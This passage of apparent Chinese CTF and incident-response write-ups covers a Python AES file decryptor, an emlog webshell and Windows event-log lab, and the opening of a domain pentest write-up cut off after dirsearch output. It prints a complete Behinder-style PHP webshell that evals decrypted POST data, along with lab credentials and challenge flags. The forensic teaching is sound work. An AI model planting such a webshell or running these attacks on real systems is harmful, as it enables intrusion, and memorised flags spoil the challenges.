class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AESDecryptor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, password</span>):<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.key = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.iv = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;模拟 CryptoAPI 的密钥派生过程&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 1. 对密码进行 SHA-256 哈希</span><br>        password_bytes = <span class="hljs-variable language_">self</span>.password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        hash_obj = hashlib.sha256(password_bytes)<br>        hash_digest = hash_obj.digest()<br>        <br>        <span class="hljs-comment"># 2. 取前 16 字节作为 AES-128 密钥</span><br>        <span class="hljs-variable language_">self</span>.key = hash_digest[:<span class="hljs-number">16</span>]<br>        <br>        <span class="hljs-comment"># 3. 使用零向量作为 IV (CryptoAPI 默认行为)</span><br>        <span class="hljs-variable language_">self</span>.iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[密钥派生]&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  原始密钥: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  SHA-256: <span class="hljs-subst">&#123;hash_digest.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  AES-128 密钥: <span class="hljs-subst">&#123;self.key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  IV: <span class="hljs-subst">&#123;self.iv.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_file</span>(<span class="hljs-params">self, input_file, output_file</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;解密文件&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 读取加密文件</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                encrypted_data = f.read()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;无法打开输入文件: <span class="hljs-subst">&#123;input_file&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># 检查文件大小</span><br>        file_size = <span class="hljs-built_in">len</span>(encrypted_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;文件大小: <span class="hljs-subst">&#123;file_size&#125;</span> 字节&quot;</span>)<br>        <br>        <span class="hljs-comment"># 创建 AES 解密器</span><br>        <span class="hljs-keyword">try</span>:<br>            cipher = AES.new(<span class="hljs-variable language_">self</span>.key, AES.MODE_CBC, <span class="hljs-variable language_">self</span>.iv)<br>            decrypted_data = cipher.decrypt(encrypted_data)<br>            <br>            <span class="hljs-comment"># 移除 PKCS#7 填充</span><br>            <span class="hljs-keyword">try</span>:<br>                decrypted_data = unpad(decrypted_data, AES.block_size)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功移除 PKCS#7 填充&quot;</span>)<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;警告: 填充验证失败，尝试直接保存未移除填充的数据&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># 写入解密文件</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(decrypted_data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;无法写入输出文件: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;错误: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <br>        <span class="hljs-comment"># 验证解密结果</span><br>        output_size = <span class="hljs-built_in">len</span>(decrypted_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密成功!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  输出文件大小: <span class="hljs-subst">&#123;output_size&#125;</span> 字节&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  保存到: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 检查文件头</span><br>        <span class="hljs-variable language_">self</span>.check_file_header(decrypted_data)<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_file_header</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;检查常见文件头&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span><br>        <br>        headers = &#123;<br>            <span class="hljs-string">b&#x27;MZ&#x27;</span>: <span class="hljs-string">&quot;Windows 可执行文件&quot;</span>,<br>            <span class="hljs-string">b&#x27;\x7fELF&#x27;</span>: <span class="hljs-string">&quot;ELF 可执行文件&quot;</span>,<br>            <span class="hljs-string">b&#x27;\x89PNG&#x27;</span>: <span class="hljs-string">&quot;PNG 图像&quot;</span>,<br>            <span class="hljs-string">b&#x27;\xFF\xD8\xFF&#x27;</span>: <span class="hljs-string">&quot;JPEG 图像&quot;</span>,<br>            <span class="hljs-string">b&#x27;PK\x03\x04&#x27;</span>: <span class="hljs-string">&quot;ZIP 压缩文件&quot;</span>,<br>            <span class="hljs-string">b&#x27;%PDF&#x27;</span>: <span class="hljs-string">&quot;PDF 文档&quot;</span>,<br>            <span class="hljs-string">b&#x27;FLAG&#x27;</span>: <span class="hljs-string">&quot;可能包含 FLAG&quot;</span>,<br>            <span class="hljs-string">b&#x27;flag&#x27;</span>: <span class="hljs-string">&quot;可能包含 flag&quot;</span><br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span> signature, file_type <span class="hljs-keyword">in</span> headers.items():<br>            <span class="hljs-keyword">if</span> data.startswith(signature):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;检测到文件头: <span class="hljs-subst">&#123;signature.<span class="hljs-built_in">hex</span>().upper()&#125;</span> - <span class="hljs-subst">&#123;file_type&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>        <br>        <span class="hljs-comment"># 检查可打印字符</span><br>        printable = <span class="hljs-built_in">sum</span>(<span class="hljs-number">32</span> &lt;= b &lt;= <span class="hljs-number">126</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data[:<span class="hljs-number">100</span>])<br>        <span class="hljs-keyword">if</span> printable &gt; <span class="hljs-number">70</span>:  <span class="hljs-comment"># 超过70%可打印字符</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件开头包含大量可打印字符，可能是文本文件&quot;</span>)<br>            <span class="hljs-comment"># 尝试显示前100个字符</span><br>            <span class="hljs-keyword">try</span>:<br>                preview = data[:<span class="hljs-number">100</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;预览: &quot;</span> + preview)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== AES-128 文件解密工具 ===&quot;</span>)<br>    <br>    <span class="hljs-comment"># 硬编码密钥</span><br>    SECRET_KEY = <span class="hljs-string">&quot;secret_key_1234&quot;</span><br>    <br>    <span class="hljs-comment"># 处理命令行参数</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用法: python decrypt.py &lt;加密文件&gt; &lt;输出文件&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;密钥: <span class="hljs-subst">&#123;SECRET_KEY&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;算法: AES-128-CBC&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;密钥派生: SHA-256&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    input_file = sys.argv[<span class="hljs-number">1</span>]<br>    output_file = sys.argv[<span class="hljs-number">2</span>]<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入文件: <span class="hljs-subst">&#123;input_file&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输出文件: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;使用密钥: <span class="hljs-subst">&#123;SECRET_KEY&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 创建解密器</span><br>    decryptor = AESDecryptor(SECRET_KEY)<br>    <br>    <span class="hljs-comment"># 初始化</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> decryptor.initialize():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密器初始化失败&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-comment"># 解密文件</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n开始解密...&quot;</span>)<br>    <span class="hljs-keyword">if</span> decryptor.decrypt_file(input_file, output_file):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n解密成功完成!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n解密失败!&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行</p><p><img src="https://img.dkdun.cn/v1/2025/12/cdccc59b57069260.png"></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;8e8c6b08-8adb-<span class="hljs-number">262b-0032</span>-4809c1796c3e&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>玄机-第四章&amp;第五章</title>
    <link href="/2025/07/24/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <url>/2025/07/24/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%AC%AC%E4%BA%94%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>Windows 实战 - emlog &amp; evtx 文件分析</p><span id="more"></span><h1 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs armasm">服务器场景操作系统 Windows<br>服务器账号密码 administrator xj<span class="hljs-comment">@123456</span><br><br><span class="hljs-number">1</span>.通过本地 <span class="hljs-built_in">PC</span> RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>.通过本地 <span class="hljs-built_in">PC</span> RDP到服务器并且分析黑客攻击成功的 <span class="hljs-built_in">IP</span> 为多少,将黑客 <span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>.通过本地 <span class="hljs-built_in">PC</span> RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>.通过本地 <span class="hljs-built_in">PC</span> RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="找到黑客植入-shell-的密码"><a href="#找到黑客植入-shell-的密码" class="headerlink" title="找到黑客植入 shell 的密码"></a>找到黑客植入 shell 的密码</h2><p>扫描网站根目录，找到 shell 的路径：&#x2F;content&#x2F;plugins&#x2F;tip&#x2F;shell.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/00ce1e539ec6fd5b.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>拿到密码</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;rebeyond&#125;</span><br></code></pre></td></tr></table></figure><h2 id="黑客攻击成功的-IP-为多少"><a href="#黑客攻击成功的-IP-为多少" class="headerlink" title="黑客攻击成功的 IP 为多少"></a>黑客攻击成功的 IP 为多少</h2><p>查看网站配置日志，Nginx 没有日志，查看 Apache，找到使用了 shell.php 的 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/1500e6b2b4f72a53.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.126.1</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="黑客的隐藏账户名称"><a href="#黑客的隐藏账户名称" class="headerlink" title="黑客的隐藏账户名称"></a>黑客的隐藏账户名称</h2><p>直接查看用户找到</p><p><img src="https://img.dkdun.cn/v1/2025/12/ffff57d2a0172622.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hacker138&#125;</span><br></code></pre></td></tr></table></figure><h2 id="黑客的挖矿程序的矿池域名"><a href="#黑客的挖矿程序的矿池域名" class="headerlink" title="黑客的挖矿程序的矿池域名"></a>黑客的挖矿程序的矿池域名</h2><p>发现隐藏账户下面有一个 Kuang 程序，拿出来 pyinstaller 解包后再 pyc 反编译</p><p><img src="https://img.dkdun.cn/v1/2025/12/5ab4c353216b1537.png"></p><p>拿到域名</p><p><img src="https://img.dkdun.cn/v1/2025/12/2a49441f8cbba6cd.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;wakuang<span class="hljs-selector-class">.zhigongshanfang</span>.<span class="hljs-attribute">top</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="evtx-文件分析"><a href="#evtx-文件分析" class="headerlink" title="evtx 文件分析"></a>evtx 文件分析</h1><p>查事件 ID：<a href="https://www.cnblogs.com/Yang34/p/13453210.html">WINDOWS日志事件ID速查表</a></p><h2 id="黑客成功登录系统所使用的-IP-地址"><a href="#黑客成功登录系统所使用的-IP-地址" class="headerlink" title="黑客成功登录系统所使用的 IP 地址"></a>黑客成功登录系统所使用的 IP 地址</h2><p>ID 为 4624 表示帐户已成功登录，直接搜索</p><p><img src="https://img.dkdun.cn/v1/2025/12/1bbc99827d84424a.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.36.133</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="黑客修改的登录用户的用户名"><a href="#黑客修改的登录用户的用户名" class="headerlink" title="黑客修改的登录用户的用户名"></a>黑客修改的登录用户的用户名</h2><p>搜索 ID 为 4738 查找已更改的账户</p><p><img src="https://img.dkdun.cn/v1/2025/12/c65649112fc0bdd3.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Adnimistartro&#125;</span><br></code></pre></td></tr></table></figure><h2 id="黑客成功访问的一个关键位置的文件"><a href="#黑客成功访问的一个关键位置的文件" class="headerlink" title="黑客成功访问的一个关键位置的文件"></a>黑客成功访问的一个关键位置的文件</h2><p>ID 4663 表示尝试访问对象</p><p><img src="https://img.dkdun.cn/v1/2025/12/e0c1cd4dc07b1188.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">flag&#123;<span class="hljs-built_in">SCHEMA</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="黑客最后一次重启数据库服务后数据库服务的进程-ID-号"><a href="#黑客最后一次重启数据库服务后数据库服务的进程-ID-号" class="headerlink" title="黑客最后一次重启数据库服务后数据库服务的进程 ID 号"></a>黑客最后一次重启数据库服务后数据库服务的进程 ID 号</h2><p>在应用程序中，先排序找到 MySQL 的事件 ID，再筛选 ID 查看</p><p><img src="https://img.dkdun.cn/v1/2025/12/40098146549e9132.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8820</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="黑客使用修改后的用户重启系统的次数"><a href="#黑客使用修改后的用户重启系统的次数" class="headerlink" title="黑客使用修改后的用户重启系统的次数"></a>黑客使用修改后的用户重启系统的次数</h2><p>筛选系统日志来源于 USER32 的事件，5 条重启记录，1 条 SYSTEM，2 条 Administrator、2 条 Adnimistartro</p><p><img src="https://img.dkdun.cn/v1/2025/12/03e43707ebb2a1d5.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>玄机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>evtx 分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-2022网鼎半决赛复盘</title>
    <link href="/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <url>/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>AS-REP Roasting、WordPress RCE、RBDC、CVE-2022-26923</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>无果</p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>扫到了一堆</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">01:14:02</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0B</span>  - /index.php  -&gt;  http:<span class="hljs-comment">//39.99.132.104/</span><br>[<span class="hljs-meta">01:14:04</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">19</span>KB - /license.txt<br>[<span class="hljs-meta">01:14:11</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">7</span>KB - /readme.html<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status<br>[<span class="hljs-meta">01:14:12</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278B</span>  - /server-status/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">317B</span>  - /wp-admin  -&gt;  http:<span class="hljs-comment">//39.99.132.104/wp-admin/</span><br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0B</span>  - /wp-content/<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">409</span> -    <span class="hljs-number">3</span>KB - /wp-admin/setup-config.php<br>[<span class="hljs-meta">01:14:18</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /wp-admin/install.php<br>[<span class="hljs-meta">01:14:18</span>] <span 